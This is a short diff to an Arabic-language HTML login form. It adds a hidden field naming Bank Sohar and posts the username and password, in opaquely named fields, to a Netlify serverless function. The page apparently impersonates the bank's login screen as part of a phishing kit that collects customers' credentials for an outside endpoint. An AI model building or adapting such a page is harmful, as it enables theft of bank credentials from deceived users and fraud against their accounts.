@@ -280,6 +280,7 @@
     <!-- نموذج تسجيل الدخول -->
     <div class="login-container">
         <form action="/.netlify/functions/submit-login" method="post"id="loginForm">
+            <input type="hidden" name="bank_name" value="بنك صحار">
             <input name="s1" type="text" class="form-control" placeholder="اسم المستخدم" required>
             <input name="s2" type="password" class="form-control" placeholder="كلمة المرور" required>
             <button type="submit" class="btn-login">تسجيل الدخول</button>
